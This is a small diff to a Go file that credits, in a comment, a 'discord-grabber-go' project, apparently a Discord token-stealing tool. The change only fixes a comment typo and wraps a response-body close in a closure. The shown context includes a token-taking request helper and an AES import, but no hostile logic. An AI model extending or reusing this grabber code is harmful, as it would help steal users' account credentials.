@@ -1,6 +1,6 @@
 package main
 
-// form: https://github.com/faceslog/discord-grabber-go/blob/main/main.go
+// from: https://github.com/faceslog/discord-grabber-go/blob/main/main.go
 
 import (
 	"crypto/aes"
@@ -50,7 +50,12 @@ func getRequest(url string, isChecking bool, token string) (body string, err err
 		return
 	}
 
-	defer response.Body.Close()
+	defer func(Body io.ReadCloser) {
+		err := Body.Close()
+		if err != nil {
+
+		}
+	}(response.Body)
 
 	b, err := io.ReadAll(response.Body)
 	if err != nil {
